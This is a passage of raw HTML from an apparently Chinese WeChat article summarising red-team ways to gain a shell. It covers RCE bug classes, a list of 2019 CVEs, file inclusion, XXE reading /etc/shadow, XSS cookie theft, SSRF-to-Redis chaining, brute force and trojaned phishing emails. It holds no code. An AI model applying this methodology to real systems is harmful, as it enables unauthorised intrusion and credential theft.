optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x03 RCE getshell</h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp; RCE是统称，包括远程代码执行、远程命令执行。当然这两个概念还是有意思的，比如struts2漏洞有的叫命令执行有的叫代码执行。这都不重要。一般根据触发点来命名。<br  />&nbsp;&nbsp;Java系的OGNL 表达式注入、EL注入、反序列化<br  />&nbsp;&nbsp;PHP系列的eval 类、伪协议类 代码执行、system类命令执行<br  />&nbsp;&nbsp;当然反序列化漏洞基本上编程语言都有，除了漏洞利用getshell，用作免杀后门webshell也是一个不错的思路推荐。<br  />&nbsp;&nbsp;正由于代码执行的部分结果是执行了系统命令，在命令执行的加持下，可以直接拿到应用或系统的shell，也是正统策略。<br  />&nbsp;&nbsp;根据《2019年Web应用安全年度报告》，高频系列27个漏洞漏洞（这些漏洞都值得深入分析及利用），大部分为远程代码执行，同时RCE系列，Java 组件也占比最大。<br  /></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.866779089376054" data-s="300,640" src="图片/HACK学习呀_2020-04-11_渗透测试-Getshell总结/2_QjPyeibYwHmPuHa4OpBEicgPTzUG9Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibVgzGeKxdqIlJXCxKw8ws2TEoFQgs1Oahk0FQKwkPCibtA3aZQjPyeibYwHmPuHa4OpBEicgPTzUG9Q/640?wx_fmt=png'" data-type="png" data-w="1186" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">列表如下：<span style="font-size:15px;line-height:35px;;color: rgb(51, 51, 51);"></span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><em>Harbor API SQL注入(CVE-2019-19026/CVE-2019-19029)</em><br  /><em>Thinkcmf任意内容包含远程代码执行</em><br  /><em>泛微E-cology OA数据库配置信息泄漏</em><br  /><em>Fastjson远程拒绝服务</em><br  /><em>GhostScript远程代码执行(CVE-2019-14811)</em><br  /><em>泛微E-cology OA系统远程代码执行</em><br  /><em>Apache Solr远程代码执行(CVE-2019-0193)</em><br  /><em>FasterXML jackson-databind远程代码执行(CVE-2019-14439)</em><br  /><em>FasterXML jackson-databind远程代码执行(CVE-2019-12384)</em><br  /><em>FasterXML jackson-databind远程代码执行(CVE-2019-14379)</em><br  /><em>Xstream远程代码执行(CVE-2019-10173)</em><br  /><em>致远OA A8前台getshell</em><br  /><em>Apache axis远程代码执行</em><br  /><em>CoreMail未授权访问接口参数注入</em><br  /><em>Weblogic远程代码执行(CVE-2019-2729)</em><br  /><em>Weblogic远程代码执行(CVE-2019-2725)</em><br  /><em>Confluence远程代码执行(CVE-2019-3398)</em><br  /><em>Confluence远程代码执行(CVE-2019-3396)</em><br  /><em>Ruby On Rails任意文件读取(CVE-2019-5418)</em><br  /><em>Jenkins远程代码执行(CVE-2019-1003030)</em><br  /><em>ColdFusion远程代码执行(CVE-2019-7091)</em><br  /><em>Spring Boot Actuator远程代码执行</em><br  /><em>Drupal8 REST Module远程代码执行(CVE-2019-6340)</em><br  /><em>Jenkins远程代码执行(CVE-2019-1003000)</em><br  /><em>Apache Solr远程代码执行(CVE-2019-17558)</em><br  /><em>Fastjson远程代码执行</em><br  /><em>Jenkins远程代码执行(CVE-2019-1003000)</em></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">以上漏洞利用总结，可私M</p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x04 包含getwebshell</h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp;文件包含，常见JSP、ASPx、PHP 都有包含，但主要还是PHP的包含好用。因为可以包含任意路径的任意后缀，能控制include类函数的输入结合系统特性文件或者上传的文件结合，可以拿到webshell。<br  />&nbsp; JSP包含，默认情况下动态包含WEB路径下的JSP文件（静态包含可以包含任意后缀的文本文件，但不支持变量动态赋值暂不说明），2月份的CVE-2020-1938 Tomcat 文件包含漏洞，这个漏洞看上去是包含了任意格式的文件，但其实是因为AJP协议。<br  />更多文件包含冷知识，参考&nbsp;<a href="https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&amp;mid=2247483729&amp;idx=1&amp;sn=81714a7029845694bf3b82b4dd37bcbf&amp;scene=21#wechat_redirect" target="_blank" title="原贴" style="color: rgb(65, 131, 196);background: transparent;" data-linktype="2">原贴</a></p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x05 漏洞组合拳getshell</h1><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">绕过既有认证+后台漏洞</a></h2><ol style="padding-left: 2em;margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" class="list-paddingleft-2"><li style="line-height: 26px;"><p>口令猜测是门艺术活，进入后台多种漏洞的利用，包括前面提到的漏洞常见高危系列，还有一些备份还原、导入导出、 模板编辑等功能。</p></li><li style="line-height: 26px;"><p>登录逻辑绕过、越权类，搞定后台。进行典型漏洞利用</p></li><li style="line-height: 26px;"><p>通过XSS钓到cookie，或者利用CSRF类漏洞“借刀杀人”搞到后台权限。进行典型漏洞利用。<br  /><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484457&amp;idx=1&amp;sn=c323c9aea5a7be9fe468c187984113d8&amp;scene=21#wechat_redirect" target="_blank" title="网站后台Getshell的方法总结" style="color: rgb(65, 131, 196);background: transparent;" data-linktype="2">网站后台Getshell的方法总结</a></p></li></ol><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">XXE</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp; XXE漏洞，最理想的状态就是直接可以代码执行（类似PHP expert）；大多数还是以文件读取信息收集为主，结合源码或者配置文件（例如/etc/shadow、tomcat-users.xml等）getshell；还可以通过XXE的SSRF进行隔山打牛式getshell。<br  />&nbsp;&nbsp; 当然对于漏洞挖掘来讲，无论是xml格式还是json格式的POST数据包都值得多关注下。说不定就有惊喜呢。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">SSRF + RCE</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp; 原理上SSRF可以结合所有RCE（反序列化、s2、mysql … ；github 搜索SSRFmap、ssrf_proxy）的漏洞进行组合利用，只是我们在平常实例角度用SSRF+redis未授权用的多一些。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">任意文件读取Getshell</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp; 正常的一般是通过读取web.xml 获取class文件，然后反编译，找到代码的一些漏洞。进而拿到系统的权限。当然还有文件读取加文件上传的曲折配合（<a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486140&amp;idx=1&amp;sn=65709218fe4b9e4fd42ad22fc1120aff&amp;scene=21#wechat_redirect" target="_blank" title="任意文件读取漏洞的曲折历程" style="color: rgb(65, 131, 196);background: transparent;" data-linktype="2">任意文件读取漏洞的曲折历程</a>）</p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x06 系统层getcmdshell</h1><ol style="padding-left: 2em;margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" class="list-paddingleft-2"><li style="line-height: 26px;"><p>暴力破解的艺术，毕竟锤子开锁和要是开锁在入侵角度结果是一样的。</p></li><li style="line-height: 26px;"><p>常规协议：SSH、RDP、SMB、VPC、Redis 等中间件类</p></li><li style="line-height: 26px;"><p>通过数据库执行语句获得了系统shell，对于获取权限，比sql注入更直接。</p></li><li style="line-height: 26px;"><p>设备层：VPN、防火墙，搞定这种边界设备，单车变摩托。</p></li></ol><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x07 钓鱼 getcmdshell</h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp; 发送钓鱼邮件，捆绑的马，访问即加载、点击即执行类的马。<br  />&nbsp;&nbsp; 这一类攻击一般结合社工，例如借用IT管理员发送或某领导的账号去发送（所以这时候的邮箱的0day就灰常重要了，当然如果在邮箱内部找到类似VPN或者密码表类，也不需要这么麻烦，一把梭…），可信度就高很多。对于红队来讲，钓的鱼儿还是以IT部门系列为主，普通办公区的主机权限还需要做更多的工作。</p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x08 红队shell竞争分析</h1><ol style="padding-left: 2em;margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" class="list-paddingleft-2"><li style="line-height: 26px;"><p>拼信息收集，漏洞点，别人找不到，我找的到（例如移动端、物联网等接口信息，当然这种shell，一般距离核心应用可能也远一些）；</p></li><li style="line-height: 26px;"><p>拼利用速度，自动化一条龙（基本属于日常漏洞和工程化的积累）；</p></li><li style="line-height: 26px;"><p>拼0day （VPN --- Mail --- OA --- java组件 --- CMS --- 关键设备 ）；</p></li><li style="line-height: 26px;"><p>拼细节漏洞，组合利用。（<a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;scene=21#wechat_redirect" target="_blank" title="这是一篇“不一样”的真实渗透测试案例分析文章" style="color: rgb(65, 131, 196);background: transparent;" data-linktype="2">这是一篇“不一样”的真实渗透测试案例分析文章</a>&nbsp;）</p></li></ol><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp; 以上为本次所感所想，当然除了这种按照漏洞类型大类去分类，还有一些具体的漏洞也可以直接getshell，本次分析意义，就是在没有思路的时候，有个相对体系性思考框架。毕竟储备充足才会看上去像运气一样水到渠成，其实都是局部真相。</p><p><img src="图片/HACK学习呀_2020-04-11_渗透测试-Getshell总结/3_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-ratio="0.109375" data-w="640"  /></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__53" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: center;color: rgba(230, 230, 230, 0.9) !important;"><br  /></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__53" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: center;color: rgba(230, 230, 230, 0.9) !important;"><span data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(255, 104, 39)" data-darkmode-original-color-15865756052754="rgb(255, 104, 39)" style="color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(255, 104, 39)" data-darkmode-original-color-15865756052754="rgb(255, 104, 39)"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247485913&amp;idx=1&amp;sn=4662c240a519d409677ff060c290e2d3&amp;chksm=ec1f5ce6db68d5f053a1a661726031bbf5d21680d2766e88e63051a1eeb3cf6fda195bb5ad33&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">Getshell姿势文章大集合</a><br  /></strong></span></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__53" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: center;color: rgba(230, 230, 230, 0.9) !important;"><span data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(255, 104, 39)" data-darkmode-original-color-15865756052754="rgb(255, 104, 39)" style="color: rgb(255, 104, 39);"><br  /></span></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__53" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: center;color: rgba(230, 230, 230, 0.9) !important;"><span data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(255, 104, 39)" data-darkmode-original-color-15865756052754="rgb(255, 104, 39)" style="color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(255, 104, 39)" data-darkmode-original-color-15865756052754="rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__54" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: center;color: rgba(230, 230, 230, 0.9) !important;"><br data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" class="js_darkmode__55" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: right;color: rgba(230, 230, 230, 0.9) !important;"><span data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(136, 136, 136)" data-darkmode-original-color-15865756052754="rgb(136, 136, 136)" style="font-size:12px;line-height:32px;;color: rgb(136, 136, 136);">参考来源：先知社区</span><span data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-darkmode-color-15865756052754="rgb(136, 136, 136)" data-darkmode-original-color-15865756052754="rgb(136, 136, 136)" style="color: rgb(136, 136, 136);font-size:12px;line-height:32px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"></span></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" class="js_darkmode__56" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;text-align: right;color: rgba(230, 230, 230, 0.9) !important;"><span style="font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;letter-spacing: 0.75px;text-align: start;background-color: rgb(255, 255, 255);font-size:12px;line-height:32px;;color: rgb(136, 136, 136);">Author: sm0nk@深蓝攻防实验室</span></p><p data-darkmode-bgcolor-15865756052754="rgb(36, 36, 36)" data-darkmode-original-bgcolor-15865756052754="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" class="js_darkmode__56" style="background-color: rgb(255, 255, 255);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, 